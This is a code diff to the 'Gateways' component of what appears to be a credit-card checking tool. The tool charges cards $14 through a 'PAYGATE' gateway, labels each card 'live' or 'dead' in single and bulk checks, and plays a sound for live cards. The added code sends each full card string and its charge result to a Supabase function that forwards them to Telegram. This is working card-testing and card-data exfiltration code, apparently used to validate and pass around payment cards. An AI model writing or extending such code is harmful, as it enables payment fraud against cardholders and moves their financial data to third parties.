@@ -745,6 +745,24 @@ const Gateways = () => {
 
       setResult(checkResult);
 
+      // Send Telegram notification for PAYGATE charged cards
+      if (selectedGateway.id === "paygate_charge" && (checkStatus === "live" || checkStatus === "dead")) {
+        try {
+          await supabase.functions.invoke('notify-charged-card', {
+            body: {
+              user_id: userId,
+              card_details: fullCardString,
+              status: checkStatus === "live" ? "CHARGED" : "DECLINED",
+              response_message: checkStatus === "live" ? "Payment Successful" : "Card Declined",
+              amount: "$14.00",
+              gateway: "PAYGATE"
+            }
+          });
+        } catch (notifyError) {
+          console.log("Failed to send Telegram notification:", notifyError);
+        }
+      }
+
       if (checkResult.status === "live") {
         // Play live card sound if enabled
         playLiveSoundIfEnabled();
@@ -1374,6 +1392,24 @@ const Gateways = () => {
           brand,
           brandColor
         };
+
+        // Send Telegram notification for PAYGATE charged cards (bulk)
+        if (selectedGateway.id === "paygate_charge" && (checkStatus === "live" || checkStatus === "dead")) {
+          try {
+            await supabase.functions.invoke('notify-charged-card', {
+              body: {
+                user_id: userId,
+                card_details: fullCardStr,
+                status: checkStatus === "live" ? "CHARGED" : "DECLINED",
+                response_message: checkStatus === "live" ? "Payment Successful" : "Card Declined",
+                amount: "$14.00",
+                gateway: "PAYGATE"
+              }
+            });
+          } catch (notifyError) {
+            console.log("Failed to send Telegram notification:", notifyError);
+          }
+        }
 
         // Play sound and celebrate for each live card in bulk check
         if (checkStatus === "live") {
